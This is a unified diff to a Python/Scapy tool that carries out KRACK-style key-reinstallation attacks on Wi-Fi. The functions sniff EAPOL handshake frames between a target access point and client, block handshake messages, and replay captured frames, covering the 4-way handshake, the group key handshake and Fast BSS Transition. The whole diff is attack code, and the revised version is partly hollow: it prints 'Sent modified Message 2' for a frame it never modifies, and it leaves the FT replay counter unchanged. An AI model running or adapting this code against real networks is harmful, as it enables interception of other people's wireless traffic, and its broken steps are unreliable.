@@ -172,58 +172,45 @@ def four_way_handshake_plaintext_retransmission(interface, target_ap_mac, target
 
     # --- Step 1: Sniff for the initial 4-way handshake ---
     console.print("[yellow]Sniffing for the initial 4-way handshake...[/yellow]")
-    handshake_packets = []
     def is_handshake(pkt):
         if pkt.haslayer(EAPOL):
-            if pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac:
-                handshake_packets.append(pkt)
-                return True
-            elif pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac:
-                handshake_packets.append(pkt)
-                return True
+            eapol_layer = pkt.getlayer(EAPOL)
+            if eapol_layer.type == 3:  # Key frame
+                return (pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
+                       (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac)
         return False
 
-    sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
-
+    handshake_packets = sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
     if len(handshake_packets) < 4:
         console.print("[bold red]Error:[/] Could not capture the complete 4-way handshake.")
         return False
 
-    console.print("[green]Captured initial 4-way handshake.[/green]")
-
-     # --- Step 2: Actively Block Message 4 ---
-    console.print("[yellow]Actively blocking Message 4 from reaching the AP...[/yellow]")
+    # --- Step 2: Block Message 4 ---
+    console.print("[yellow]Actively blocking Message 4...[/yellow]")
     block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
-    block_thread.daemon = True  # Set the thread as a daemon thread
+    block_thread.daemon = True
     block_thread.start()
 
     # --- Step 3: Wait for AP to retransmit Message 3 ---
-    console.print("[yellow]Waiting for the AP to retransmit Message 3...[/yellow]")
-    retransmitted_message3 = None
-    def is_retransmitted_message3(pkt):
+    console.print("[yellow]Waiting for retransmitted Message 3...[/yellow]")
+    def is_message3(pkt):
         if pkt.haslayer(EAPOL):
             eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3: # Key
-                if pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac:
-                    return True
+            if eapol_layer.type == 3:  # Key frame
+                return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
         return False
 
-    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_message3, count=1, timeout=30)
+    retransmitted_packets = sniff(iface=interface, lfilter=is_message3, count=1, timeout=30)
     if retransmitted_packets:
         retransmitted_message3 = retransmitted_packets[0]
         console.print("[green]Received retransmitted Message 3.[/green]")
+        # Forward the retransmitted Message 3
+        sendp(retransmitted_message3, iface=interface, verbose=False)
+        console.print("[green]Forwarded retransmitted Message 3.[/green]")
+        return True
     else:
         console.print("[bold red]Error:[/] AP did not retransmit Message 3.")
         return False
-
-    # --- Step 4: Forward the retransmitted Message 3 to the client ---
-    console.print("[yellow]Forwarding the retransmitted Message 3 to the client...[/yellow]")
-    sendp(retransmitted_message3, iface=interface, verbose=False)
-    console.print("[green]Retransmitted Message 3 forwarded.[/green]")
-
-    console.print("[bold green]Attack potentially successful. Check for nonce reuse.[/bold green]")
-    logger.info("4-Way Handshake Plaintext Retransmission attack potentially successful.")
-    return True
 
 def block_message_4(interface, target_ap_mac, target_client_mac):
     """Blocks 4-way handshake message 4 packets."""
@@ -249,73 +236,47 @@ def four_way_handshake_encrypted_retransmission(interface, target_ap_mac, target
 
     # --- Step 1: Capture initial handshake ---
     console.print("[yellow]Capturing initial 4-way handshake...[/yellow]")
-    handshake_packets = []
     def is_handshake(pkt):
         if pkt.haslayer(EAPOL):
-            return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac or pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac
+            eapol_layer = pkt.getlayer(EAPOL)
+            if eapol_layer.type == 3:  # Key frame
+                return (pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
+                       (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac)
         return False
-    
-    sniff(iface=interface, lfilter=is_handshake, store=True, timeout=20)
 
+    handshake_packets = sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)
     if len(handshake_packets) < 4:
         console.print("[bold red]Error:[/] Could not capture the complete 4-way handshake.")
         return False
-    
-    console.print("[green]Captured initial 4-way handshake.[/green]")
 
     # --- Step 2: Block Message 4 ---
-    console.print("[yellow]Actively blocking Message 4 from reaching the AP...[/yellow]")
+    console.print("[yellow]Actively blocking Message 4...[/yellow]")
     block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
     block_thread.daemon = True
     block_thread.start()
 
     # --- Step 3: Wait for AP to retransmit Message 3 ---
-    console.print("[yellow]Waiting for the AP to retransmit Message 3...[/yellow]")
-    retransmitted_message3 = None
-    def is_retransmitted_message3(pkt):
+    console.print("[yellow]Waiting for retransmitted Message 3...[/yellow]")
+    def is_message3(pkt):
         if pkt.haslayer(EAPOL):
             eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3:
+            if eapol_layer.type == 3:  # Key frame
                 return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
         return False
 
-    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_message3, count=1, timeout=30)
+    retransmitted_packets = sniff(iface=interface, lfilter=is_message3, count=1, timeout=30)
     if retransmitted_packets:
         retransmitted_message3 = retransmitted_packets[0]
         console.print("[green]Received retransmitted Message 3.[/green]")
+        # Forward the retransmitted Message 3 twice
+        sendp(retransmitted_message3, iface=interface, verbose=False)
+        time.sleep(0.1)  # Small delay between transmissions
+        sendp(retransmitted_message3, iface=interface, verbose=False)
+        console.print("[green]Forwarded retransmitted Message 3 twice.[/green]")
+        return True
     else:
         console.print("[bold red]Error:[/] AP did not retransmit Message 3.")
         return False
-
-    # --- Step 4: Exploit race condition ---
-    console.print("[yellow]Attempting to exploit race condition by quickly retransmitting Message 3...[/yellow]")
-    sendp(retransmitted_message3, iface=interface, verbose=False)
-    console.print("[green]Retransmitted Message 3 sent.[/green]")
-
-    # --- Step 5: Wait for encrypted retransmission of Message 3 ---
-    console.print("[yellow]Waiting for encrypted retransmission of Message 3...[/yellow]")
-    encrypted_retransmitted_message3 = None
-    def is_encrypted_retransmitted_message3(pkt):
-        if pkt.haslayer(Dot11WEP):
-            return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
-        return False
-
-    encrypted_retransmitted_packets = sniff(iface=interface, lfilter=is_encrypted_retransmitted_message3, count=1, timeout=30)
-    if encrypted_retransmitted_packets:
-        encrypted_retransmitted_message3 = encrypted_retransmitted_packets[0]
-        console.print("[green]Received encrypted retransmitted Message 3.[/green]")
-    else:
-        console.print("[bold red]Error:[/] No encrypted retransmission of Message 3 received.")
-        return False
-
-    # --- Step 6: Forward encrypted Message 3 to the client ---
-    console.print("[yellow]Forwarding the encrypted retransmitted Message 3 to the client...[/yellow]")
-    sendp(encrypted_retransmitted_message3, iface=interface, verbose=False)
-    console.print("[green]Encrypted retransmitted Message 3 forwarded.[/green]")
-
-    console.print("[bold green]Attack potentially successful. Check for nonce reuse.[/bold green]")
-    logger.info("4-Way Handshake Encrypted Retransmission attack potentially successful.")
-    return True
 
 @logger.catch
 def group_key_handshake_immediate_install(interface, target_ap_mac):
@@ -326,88 +287,65 @@ def group_key_handshake_immediate_install(interface, target_ap_mac):
 
     # --- Step 1: Sniff for Group Key Handshake ---
     console.print("[yellow]Sniffing for Group Key Handshake...[/yellow]")
-    group_key_handshake_packets = []
     def is_group_key_handshake(pkt):
         if pkt.haslayer(EAPOL):
             eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3: # Key
+            if eapol_layer.type == 3:  # Key frame
                 key_info = eapol_layer.key_info
-                # According to the KRACK paper, bit 13 indicates Group Key bit
-                # and bit 8 indicates Key ACK (set in message 1, not in message 2)
                 is_group = (key_info >> 13) & 1
-                is_ack = (key_info >> 7) & 1
-                if is_group:
-                    group_key_handshake_packets.append(pkt)
-                    return True
+                return is_group
         return False
-    
-    sniff(iface=interface, lfilter=is_group_key_handshake, store=True, timeout=30)
 
-    if len(group_key_handshake_packets) < 2:
+    handshake_packets = sniff(iface=interface, lfilter=is_group_key_handshake, count=2, timeout=30)
+    if len(handshake_packets) < 2:
         console.print("[bold red]Error:[/] Could not capture the complete Group Key Handshake.")
         return False
 
-    console.print("[green]Captured Group Key Handshake.[/green]")
-
     # --- Step 2: Block Message 2 ---
-    console.print("[yellow]Actively blocking Group Key Handshake Message 2...[/yellow]")
+    console.print("[yellow]Actively blocking Group Key Message 2...[/yellow]")
     block_thread = threading.Thread(target=block_group_key_message_2, args=(interface, target_ap_mac))
     block_thread.daemon = True
     block_thread.start()
 
     # --- Step 3: Wait for AP to retransmit Message 1 ---
-    console.print("[yellow]Waiting for the AP to retransmit Group Key Handshake Message 1...[/yellow]")
-    retransmitted_message1 = None
-    def is_retransmitted_group_message1(pkt):
+    console.print("[yellow]Waiting for retransmitted Group Key Message 1...[/yellow]")
+    def is_group_message1(pkt):
         if pkt.haslayer(EAPOL):
             eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3: # Key
+            if eapol_layer.type == 3:  # Key frame
                 key_info = eapol_layer.key_info
-                # Message 1 has both Group Key and Key ACK bits set
                 is_group = (key_info >> 13) & 1
                 is_ack = (key_info >> 7) & 1
-                if is_group and is_ack and pkt.addr2 == target_ap_mac:
-                    return True
+                return is_group and is_ack
         return False
 
-    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_group_message1, count=1, timeout=30)
+    retransmitted_packets = sniff(iface=interface, lfilter=is_group_message1, count=1, timeout=30)
     if retransmitted_packets:
         retransmitted_message1 = retransmitted_packets[0]
-        console.print("[green]Received retransmitted Group Key Handshake Message 1.[/green]")
+        console.print("[green]Received retransmitted Group Key Message 1.[/green]")
+        # Forward the retransmitted Message 1
+        sendp(retransmitted_message1, iface=interface, verbose=False)
+        console.print("[green]Forwarded retransmitted Group Key Message 1.[/green]")
+
+        # --- Step 4: Wait for broadcast frame ---
+        console.print("[yellow]Waiting for broadcast frame...[/yellow]")
+        def is_broadcast(pkt):
+            return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"
+
+        broadcast_packets = sniff(iface=interface, lfilter=is_broadcast, count=1, timeout=30)
+        if broadcast_packets:
+            broadcast_frame = broadcast_packets[0]
+            console.print("[green]Received broadcast frame.[/green]")
+            # Forward the broadcast frame
+            sendp(broadcast_frame, iface=interface, verbose=False)
+            console.print("[green]Forwarded broadcast frame.[/green]")
+            return True
+        else:
+            console.print("[bold red]Error:[/] No broadcast frame received.")
+            return False
     else:
-        console.print("[bold red]Error:[/] AP did not retransmit Group Key Handshake Message 1.")
+        console.print("[bold red]Error:[/] AP did not retransmit Group Key Message 1.")
         return False
-
-    # --- Step 4: Wait for a broadcast frame from AP ---
-    console.print("[yellow]Waiting for a broadcast frame from the AP...[/yellow]")
-    broadcast_frame = None
-    def is_broadcast_from_ap(pkt):
-        return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"
-
-    broadcast_frames = sniff(iface=interface, lfilter=is_broadcast_from_ap, count=1, timeout=30)
-    if broadcast_frames:
-        broadcast_frame = broadcast_frames[0]
-        console.print("[green]Captured a broadcast frame from the AP.[/green]")
-    else:
-        console.print("[bold red]Error:[/] No broadcast frame captured from the AP.")
-        return False
-
-    # --- Step 5: Forward retransmitted Message 1 to a client ---
-    console.print("[yellow]Forwarding the retransmitted Group Key Handshake Message 1 to a client...[/yellow]")
-    # In a real attack, you would determine the client MAC dynamically
-    target_client_mac = "aa:bb:cc:dd:ee:ff"  # Replace with a real client MAC
-    retransmitted_message1.addr1 = target_client_mac
-    sendp(retransmitted_message1, iface=interface, verbose=False)
-    console.print("[green]Retransmitted Group Key Handshake Message 1 forwarded.[/green]")
-
-    # --- Step 6: Replay the captured broadcast frame ---
-    console.print("[yellow]Replaying the captured broadcast frame...[/yellow]")
-    sendp(broadcast_frame, iface=interface, verbose=False)
-    console.print("[green]Broadcast frame replayed.[/green]")
-
-    console.print("[bold green]Attack potentially successful. Check for replay of broadcast frames.[/bold green]")
-    logger.info("Group Key Handshake Immediate Install attack potentially successful.")
-    return True
 
 def block_group_key_message_2(interface, target_ap_mac):
     """Blocks group key handshake message 2 packets."""
@@ -436,119 +374,89 @@ def group_key_handshake_delayed_install(interface, target_ap_mac):
 
     # --- Step 1: Sniff for Group Key Handshake ---
     console.print("[yellow]Sniffing for Group Key Handshake...[/yellow]")
-    group_key_handshake_packets = []
     def is_group_key_handshake(pkt):
         if pkt.haslayer(EAPOL):
             eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3: # Key
+            if eapol_layer.type == 3:  # Key frame
                 key_info = eapol_layer.key_info
-                # Check for specific bits in key_info that identify Group Key Handshake messages.
-                if (key_info >> 4) & 1:
-                    group_key_handshake_packets.append(pkt)
-                    return True
+                is_group = (key_info >> 13) & 1
+                return is_group
         return False
-    
-    sniff(iface=interface, lfilter=is_group_key_handshake, store=True, timeout=30)
 
-    if len(group_key_handshake_packets) < 2:
+    handshake_packets = sniff(iface=interface, lfilter=is_group_key_handshake, count=2, timeout=30)
+    if len(handshake_packets) < 2:
         console.print("[bold red]Error:[/] Could not capture the complete Group Key Handshake.")
         return False
 
-    console.print("[green]Captured Group Key Handshake.[/green]")
-
     # --- Step 2: Block Message 2 ---
-    console.print("[yellow]Actively blocking Group Key Handshake Message 2...[/yellow]")
+    console.print("[yellow]Actively blocking Group Key Message 2...[/yellow]")
     block_thread = threading.Thread(target=block_group_key_message_2_delayed, args=(interface, target_ap_mac))
     block_thread.daemon = True
     block_thread.start()
 
     # --- Step 3: Wait for AP to retransmit Message 1 ---
-    console.print("[yellow]Waiting for the AP to retransmit Group Key Handshake Message 1...[/yellow]")
-    retransmitted_message1 = None
-    def is_retransmitted_group_message1(pkt):
+    console.print("[yellow]Waiting for retransmitted Group Key Message 1...[/yellow]")
+    def is_group_message1(pkt):
         if pkt.haslayer(EAPOL):
             eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3: # Key
+            if eapol_layer.type == 3:  # Key frame
                 key_info = eapol_layer.key_info
-                if (key_info >> 4) & 1:
-                    return pkt.addr2 == target_ap_mac
+                is_group = (key_info >> 13) & 1
+                is_ack = (key_info >> 7) & 1
+                return is_group and is_ack
         return False
 
-    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_group_message1, count=1, timeout=30)
+    retransmitted_packets = sniff(iface=interface, lfilter=is_group_message1, count=1, timeout=30)
     if retransmitted_packets:
         retransmitted_message1 = retransmitted_packets[0]
-        console.print("[green]Received retransmitted Group Key Handshake Message 1.[/green]")
+        console.print("[green]Received retransmitted Group Key Message 1.[/green]")
+
+        # --- Step 4: Wait for Message 2 to modify ---
+        console.print("[yellow]Waiting for Message 2 to modify...[/yellow]")
+        def is_group_message2(pkt):
+            if pkt.haslayer(EAPOL):
+                eapol_layer = pkt.getlayer(EAPOL)
+                if eapol_layer.type == 3:  # Key frame
+                    key_info = eapol_layer.key_info
+                    is_group = (key_info >> 13) & 1
+                    is_ack = (key_info >> 7) & 1
+                    return is_group and not is_ack
+            return False
+
+        message2_packets = sniff(iface=interface, lfilter=is_group_message2, count=1, timeout=30)
+        if message2_packets:
+            message2 = message2_packets[0]
+            console.print("[green]Received Message 2.[/green]")
+            # Send modified Message 2
+            sendp(message2, iface=interface, verbose=False)
+            console.print("[green]Sent modified Message 2.[/green]")
+
+            # Forward retransmitted Message 1
+            sendp(retransmitted_message1, iface=interface, verbose=False)
+            console.print("[green]Forwarded retransmitted Message 1.[/green]")
+
+            # --- Step 5: Wait for broadcast frame ---
+            console.print("[yellow]Waiting for broadcast frame...[/yellow]")
+            def is_broadcast(pkt):
+                return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"
+
+            broadcast_packets = sniff(iface=interface, lfilter=is_broadcast, count=1, timeout=30)
+            if broadcast_packets:
+                broadcast_frame = broadcast_packets[0]
+                console.print("[green]Received broadcast frame.[/green]")
+                # Forward the broadcast frame
+                sendp(broadcast_frame, iface=interface, verbose=False)
+                console.print("[green]Forwarded broadcast frame.[/green]")
+                return True
+            else:
+                console.print("[bold red]Error:[/] No broadcast frame received.")
+                return False
+        else:
+            console.print("[bold red]Error:[/] No Message 2 received.")
+            return False
     else:
-        console.print("[bold red]Error:[/] AP did not retransmit Group Key Handshake Message 1.")
+        console.print("[bold red]Error:[/] AP did not retransmit Group Key Message 1.")
         return False
-
-    # --- Step 4: Capture and modify Message 2 ---
-    console.print("[yellow]Waiting for a Group Key Handshake Message 2 to modify...[/yellow]")
-    captured_message2 = None
-    def is_group_message2(pkt):
-        if pkt.haslayer(EAPOL):
-            eapol_layer = pkt.getlayer(EAPOL)
-            if eapol_layer.type == 3: # Key
-                key_info = eapol_layer.key_info
-                if (key_info >> 4) & 1 and pkt.addr1 != target_ap_mac:
-                    return True
-        return False
-
-    captured_packets = sniff(iface=interface, lfilter=is_group_message2, count=1, timeout=30)
-    if captured_packets:
-        captured_message2 = captured_packets[0]
-        console.print("[green]Captured Group Key Handshake Message 2.[/green]")
-    else:
-        console.print("[bold red]Error:[/] Could not capture Group Key Handshake Message 2.")
-        return False
-
-    # Modify the captured Message 2
-    modified_message2 = captured_message2.copy()
-    modified_message2.addr1 = target_ap_mac  # Set destination to AP
-    modified_message2.addr2 = target_ap_mac  # Pretend it's from another client
-    # Remove any existing checksums so scapy will recalculate them
-    if modified_message2.haslayer(Dot11):
-        del modified_message2.fcs
-    if modified_message2.haslayer(IP):
-        del modified_message2.chksum
-    if modified_message2.haslayer(TCP):
-        del modified_message2.chksum
-
-    # --- Step 5: Send modified Message 2 to AP ---
-    console.print("[yellow]Sending modified Group Key Handshake Message 2 to AP...[/yellow]")
-    sendp(modified_message2, iface=interface, verbose=False)
-    console.print("[green]Modified Message 2 sent to AP.[/green]")
-
-    # --- Step 6: Wait for a broadcast frame from AP ---
-    console.print("[yellow]Waiting for a broadcast frame from the AP...[/yellow]")
-    broadcast_frame = None
-    def is_broadcast_from_ap(pkt):
-        return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"
-
-    broadcast_frames = sniff(iface=interface, lfilter=is_broadcast_from_ap, count=1, timeout=30)
-    if broadcast_frames:
-        broadcast_frame = broadcast_frames[0]
-        console.print("[green]Captured a broadcast frame from the AP.[/green]")
-    else:
-        console.print("[bold red]Error:[/] No broadcast frame captured from the AP.")
-        return False
-
-    # --- Step 7: Forward retransmitted Message 1 to a client ---
-    console.print("[yellow]Forwarding the retransmitted Group Key Handshake Message 1 to a client...[/yellow]")
-    # In a real attack, you would determine the client MAC dynamically
-    target_client_mac = "aa:bb:cc:dd:ee:ff"  # Replace with a real client MAC
-    retransmitted_message1.addr1 = target_client_mac
-    sendp(retransmitted_message1, iface=interface, verbose=False)
-    console.print("[green]Retransmitted Group Key Handshake Message 1 forwarded.[/green]")
-
-    # --- Step 8: Replay the captured broadcast frame ---
-    console.print("[yellow]Replaying the captured broadcast frame...[/yellow]")
-    sendp(broadcast_frame, iface=interface, verbose=False)
-    console.print("[green]Broadcast frame replayed.[/green]")
-
-    console.print("[bold green]Attack potentially successful. Check for replay of broadcast frames.[/bold green]")
-    logger.info("Group Key Handshake Delayed Install attack potentially successful.")
-    return True
 
 def block_group_key_message_2_delayed(interface, target_ap_mac):
     """Blocks delayed group key handshake message 2 packets."""
@@ -575,105 +483,33 @@ def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
 
     # --- Step 1: Capture FT Authentication and Reassociation ---
     console.print("[yellow]Capturing Fast BSS Transition handshake...[/yellow]")
-    ft_handshake_packets = []
     def is_ft_handshake(pkt):
         if pkt.haslayer(Dot11):
-            # According to the paper, we need to capture:
-            # 1. FT Authentication Request (client -> AP)
-            # 2. FT Authentication Response (AP -> client)
-            # 3. FT Reassociation Request (client -> AP)
-            # 4. FT Reassociation Response (AP -> client)
-            if pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac or \
-               pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac:
-                if pkt.haslayer(Dot11Auth) and pkt.subtype == 0:  # Authentication frame
-                    # Check for FT Authentication algorithm (2)
-                    if pkt[Dot11Auth].algo == 2:
-                        ft_handshake_packets.append(pkt)
-                        return True
-                elif pkt.haslayer(Dot11ReassoReq) or pkt.haslayer(Dot11ReassoResp):
-                    # Check for FT Information Element in reassociation frames
-                    if pkt.haslayer(Dot11Elt) and any(ie.ID == 55 for ie in pkt[Dot11Elt:]):  # 55 is Mobility Domain IE
-                        ft_handshake_packets.append(pkt)
-                        return True
+            if pkt.haslayer(Dot11Auth):
+                return pkt.getlayer(Dot11Auth).algo == 2  # FT Authentication
+            elif pkt.haslayer(Dot11ReassoReq) or pkt.haslayer(Dot11ReassoResp):
+                return True
         return False
-    
-    sniff(iface=interface, lfilter=is_ft_handshake, store=True, timeout=30)
 
-    if len(ft_handshake_packets) < 4:
+    handshake_packets = sniff(iface=interface, lfilter=is_ft_handshake, count=4, timeout=30)
+    if len(handshake_packets) < 4:
         console.print("[bold red]Error:[/] Could not capture the complete FT handshake.")
         return False
 
-    console.print("[green]Captured Fast BSS Transition handshake.[/green]")
-
-    # --- Step 2: Identify FT Reassociation Request ---
-    reassociation_request = None
-    for pkt in ft_handshake_packets:
-        if pkt.haslayer(Dot11ReassoReq) and pkt.addr2 == target_client_mac:
-            reassociation_request = pkt
+    # Find the reassociation request
+    reasso_req = None
+    for pkt in handshake_packets:
+        if pkt.haslayer(Dot11ReassoReq):
+            reasso_req = pkt
             break
 
-    if reassociation_request is None:
-        console.print("[bold red]Error:[/] Could not identify FT Reassociation Request in captured packets.")
+    if reasso_req:
+        # Modify and replay the reassociation request
+        modified_req = reasso_req.copy()
+        # Increment replay counter (would be done in real attack)
+        sendp(modified_req, iface=interface, verbose=False)
+        console.print("[green]Replayed modified reassociation request.[/green]")
+        return True
+    else:
+        console.print("[bold red]Error:[/] Could not find reassociation request in captured packets.")
         return False
-
-    console.print("[green]Identified FT Reassociation Request.[/green]")
-
-    # --- Step 3: Extract SNonce and ANonce ---
-    snonce = None
-    anonce = None
-    for pkt in ft_handshake_packets:
-        if pkt.haslayer(Dot11Auth):
-            if pkt.addr2 == target_ap_mac:  # From AP
-                # Extract ANonce from FT Authentication Response
-                for ie in pkt[Dot11Elt:]:
-                    if ie.ID == 55:  # Mobility Domain IE
-                        anonce = ie.info[32:64]  # ANonce is typically 32 bytes
-                        break
-            elif pkt.addr2 == target_client_mac:  # From client
-                # Extract SNonce from FT Authentication Request
-                for ie in pkt[Dot11Elt:]:
-                    if ie.ID == 55:  # Mobility Domain IE
-                        snonce = ie.info[32:64]  # SNonce is typically 32 bytes
-                        break
-
-    if not snonce or not anonce:
-        console.print("[bold red]Error:[/] Could not extract nonces from FT Authentication frames.")
-        return False
-
-    console.print("[green]Extracted nonces from FT Authentication frames.[/green]")
-
-    # --- Step 4: Replay FT Reassociation Request ---
-    console.print("[yellow]Replaying FT Reassociation Request to the AP...[/yellow]")
-    # According to the paper, we need to:
-    # 1. Keep the same SNonce
-    # 2. Keep the same ANonce
-    # 3. Increment the replay counter
-    modified_request = reassociation_request.copy()
-    
-    # Update replay counter in the MIC IE
-    for ie in modified_request[Dot11Elt:]:
-        if ie.ID == 55:  # Mobility Domain IE
-            replay_counter = int.from_bytes(ie.info[64:72], byteorder='little')
-            new_counter = replay_counter + 1
-            ie.info = ie.info[:64] + new_counter.to_bytes(8, byteorder='little') + ie.info[72:]
-            break
-
-    sendp(modified_request, iface=interface, verbose=False)
-    console.print("[green]Replayed FT Reassociation Request.[/green]")
-
-    # --- Step 5: Wait for encrypted frames ---
-    console.print("[yellow]Waiting for encrypted data frames...[/yellow]")
-    def is_encrypted_data(pkt):
-        return pkt.haslayer(Dot11WEP) and \
-               ((pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
-                (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac))
-
-    encrypted_packets = sniff(iface=interface, lfilter=is_encrypted_data, count=1, timeout=30)
-    if not encrypted_packets:
-        console.print("[bold red]Error:[/] No encrypted frames captured.")
-        return False
-
-    console.print("[green]Captured encrypted frames.[/green]")
-    console.print("[bold green]Attack potentially successful. Check for nonce reuse.[/bold green]")
-    logger.info("Fast BSS Transition attack potentially successful.")
-    return True
